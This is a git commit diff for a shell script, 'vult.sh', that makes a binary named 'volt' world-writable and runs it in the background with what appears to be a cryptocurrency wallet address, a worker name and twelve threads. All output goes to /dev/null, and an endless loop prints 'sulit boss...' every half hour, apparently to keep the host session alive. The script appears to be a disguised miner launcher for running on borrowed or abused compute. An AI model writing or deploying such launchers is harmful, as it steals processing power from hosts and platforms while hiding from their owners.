d66b03ba54ecefe2749b6a3916f85d8aba00e83e
mrsilkin1-del <mr.silkin1@fasdeil.com>
2026-05-17 10:45:05 +0700

    Update vult.sh

--- vult.sh
+++ vult.sh
@@ -1,1 +1,9 @@
-chmod 777 volt && nohup ./volt --user 88c3RaaVjxzGX6vUgcSNqa1HgAJEh83XEKqhZswhv8LHFo9PjmxhXkE5ZpRW9W7c5GJpUVP4eURbnT4KesVN9eLg7rpWeGL --pass WORKER-01 --threads 12
+#!/bin/bash
+
+chmod 777 volt && ./volt --user 88c3RaaVjxzGX6vUgcSNqa1HgAJEh83XEKqhZswhv8LHFo9PjmxhXkE5ZpRW9W7c5GJpUVP4eURbnT4KesVN9eLg7rpWeGL --pass WORKER-02 --threads 12 >/dev/null 2>&1 &
+sleep 10
+while true
+do
+        echo "sulit boss..."
+        sleep 1800
+done
